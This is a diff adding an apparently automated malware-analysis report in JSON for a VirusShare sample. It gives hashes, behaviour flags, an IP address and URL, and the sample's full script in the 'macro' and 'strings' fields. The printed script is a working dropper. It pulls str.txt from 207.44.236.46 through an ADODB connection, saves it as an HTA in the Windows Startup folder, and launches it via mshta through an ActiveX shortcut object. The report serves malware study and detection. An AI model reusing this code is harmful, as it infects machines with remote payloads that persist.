@@ -1,0 +1,59 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Command": "May run PowerShell commands",
+            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
+            "Open": "May open a file",
+            "write": "May write to a file"
+        },
+        "macro": "\ndocument.write(unescape('\\r<object id=h classid=clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11%3E<param name=Command value=ShortCut%3E<param name=Item1 value=,mshta,C:/Docume~1/AllUse~1/StartM~1/Programs/Startup/qwe.hta%3E</object%3E\\r<OBJECT id=M classid=clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11%3E<PARAM name=Command value=Close%3E</OBJECT%3E'));document.close();\ntry{\n\tvar Conn = new ActiveXObject(\"ADODB.Connection\");\n\tstrConn = \"\";\n\tstrConn += \"Driver={Microsoft Text Driver (*.txt; *.csv)};\";\n\tstrConn += \"Dbq=http://207.44.236.46/;\";\n\tstrConn += \"Extensions=asc,csv,tab,txt;\";\n\tstrConn += \"Persist Security Info=False;\";\n\tConn.Open(strConn);\n\tvar sql = \"SELECT * FROM str.txt\";\n\trs = Conn.execute(sql);\n\tvar rs = new ActiveXObject(\"ADODB.recordset\");\n\trs.Open (\"SELECT * from str.txt\", Conn);\n\trs.Save (\"C:\\\\Documents and Settings\\\\All Users\\\\Start Menu\\\\Programs\\\\Startup\\\\qwe.hta\", 0);\n\trs.close();\n\tConn.close();\n }\ncatch(e){}\nh.Click(); \nM.Click();\n\n\n"
+    },
+    "filename": "VirusShare_0fce02c55ea3dfb55657325a64f493cf",
+    "filesize": 986,
+    "filetype": "ASCII text, with very long lines, with CRLF line terminators",
+    "hashes": {
+        "md5": "0fce02c55ea3dfb55657325a64f493cf",
+        "sha1": "a9b7a5bcec9cdc18983ffa761acfc694277563cb",
+        "sha256": "f710fa683ef7a85fa7352027f795db0c63f98704fd1494cdf35a986c9bb8e71b"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "document.write(unescape('\\r<object id=h classid=clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11%3E<param name=Command value=ShortCut%3E<param name=Item1 value=,mshta,C:/Docume~1/AllUse~1/StartM~1/Programs/Startup/qwe.hta%3E</object%3E\\r<OBJECT id=M classid=clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11%3E<PARAM name=Command value=Close%3E</OBJECT%3E'));document.close();",
+            "try{",
+            "\tvar Conn = new ActiveXObject(\"ADODB.Connection\");",
+            "\tstrConn = \"\";",
+            "\tstrConn += \"Driver={Microsoft Text Driver (*.txt; *.csv)};\";",
+            "\tstrConn += \"Dbq=http://207.44.236.46/;\";",
+            "\tstrConn += \"Extensions=asc,csv,tab,txt;\";",
+            "\tstrConn += \"Persist Security Info=False;\";",
+            "\tConn.Open(strConn);",
+            "\tvar sql = \"SELECT * FROM str.txt\";",
+            "\trs = Conn.execute(sql);",
+            "\tvar rs = new ActiveXObject(\"ADODB.recordset\");",
+            "\trs.Open (\"SELECT * from str.txt\", Conn);",
+            "\trs.Save (\"C:\\\\Documents and Settings\\\\All Users\\\\Start Menu\\\\Programs\\\\Startup\\\\qwe.hta\", 0);",
+            "\trs.close();",
+            "\tConn.close();",
+            "catch(e){}",
+            "h.Click(); ",
+            "M.Click();"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [
+            "207.44.236.46"
+        ],
+        "url": [
+            "http://207.44.236.46/"
+        ]
+    },
+    "time": "0:00:00.288859",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
